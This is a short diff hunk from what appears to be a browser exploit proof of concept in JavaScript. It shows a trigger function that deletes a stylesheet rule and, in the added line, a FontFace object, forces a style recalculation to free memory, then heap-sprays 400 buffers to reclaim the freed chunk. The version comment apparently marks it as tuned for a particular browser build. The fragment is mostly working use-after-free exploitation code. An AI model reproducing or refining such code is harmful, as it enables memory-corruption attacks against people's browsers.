@@ -81,6 +81,7 @@ function trigger() {
         if (this === A && fired === 1) {
           log('GETTER FIRED - free + spray pass 1');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
+          document.fonts.delete(A);          // 14.10 shape: ALSO remove the JS face
           document.body.offsetTop;               // force recalc -> FREE
           sprayPass(1);                          // 400 buffers, 4 classes
           // drive the font machinery AFTER the spray so a reclaimed chunk
